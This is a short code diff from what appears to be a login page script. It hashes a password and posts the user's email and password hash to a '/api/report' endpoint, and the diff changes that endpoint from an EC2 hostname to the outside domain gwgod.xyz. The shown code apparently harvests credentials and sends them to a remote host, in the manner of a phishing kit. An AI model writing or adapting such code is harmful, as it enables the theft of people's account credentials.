@@ -113,7 +113,7 @@
             const encryptPassword = await sha512(password);
 
             const httpRequest = new XMLHttpRequest();
-            httpRequest.open("POST", "http://ec2-18-221-223-16.us-east-2.compute.amazonaws.com/api/report");
+            httpRequest.open("POST", "https://gwgod.xyz/api/report");
             httpRequest.setRequestHeader("Content-Type", "application/json");
             httpRequest.send(JSON.stringify({ "idVal": email, "pwVal": encryptPassword, "hugaDate": hugaDate }));
 
